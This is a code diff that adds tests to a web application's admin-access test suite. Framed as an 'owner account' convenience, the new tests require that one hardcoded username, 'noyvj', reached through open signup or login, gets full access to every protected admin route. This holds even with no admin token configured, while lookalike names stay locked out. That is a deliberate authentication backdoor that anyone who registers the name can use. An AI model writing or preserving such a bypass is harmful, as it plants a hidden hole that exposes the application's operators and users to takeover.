@@ -82,3 +82,51 @@ def test_cors_allows_the_admin_header():
 
 def test_env_fixture_is_set_for_this_suite():
     assert os.environ["ADMIN_TOKEN"] == "test-admin-token"
+
+
+# --- the owner account counts as admin without a separate token ---
+
+def _bearer(username, password="hunter22"):
+    resp = client.post("/auth/signup", json={"username": username, "password": password})
+    if resp.status_code == 409:
+        resp = client.post("/auth/login", json={"username": username, "password": password})
+    return {"Authorization": f"Bearer {resp.json()['bearer_token']}"}
+
+
+def test_owner_account_is_admin_without_a_token():
+    headers = _bearer("noyvj")
+    for path in PROTECTED:
+        assert client.get(path, headers=headers).status_code == 200, path
+
+
+def test_owner_account_works_even_when_no_token_is_configured(monkeypatch):
+    monkeypatch.delenv("ADMIN_TOKEN")
+    monkeypatch.delenv("AI_ADMIN_TOKEN")
+    headers = _bearer("noyvj")
+    for path in PROTECTED:
+        assert client.get(path, headers=headers).status_code == 200, path
+
+
+def test_other_accounts_are_not_admin():
+    headers = _bearer("notowner1")
+    for path in PROTECTED:
+        assert client.get(path, headers=headers).status_code == 401, path
+
+
+def test_other_accounts_stay_locked_out_when_no_token_is_configured(monkeypatch):
+    monkeypatch.delenv("ADMIN_TOKEN")
+    monkeypatch.delenv("AI_ADMIN_TOKEN")
+    headers = _bearer("notowner1")
+    for path in PROTECTED:
+        assert client.get(path, headers=headers).status_code == 503, path
+
+
+def test_garbage_bearer_is_not_admin():
+    for path in PROTECTED:
+        assert client.get(path, headers={"Authorization": "Bearer nonsense"}).status_code == 401, path
+
+
+def test_owner_lookalike_names_are_not_admin():
+    for name in ("noyvj2", "noyvjj", "xnoyvj"):
+        headers = _bearer(name)
+        assert client.get("/admin/stats", headers=headers).status_code == 401, name
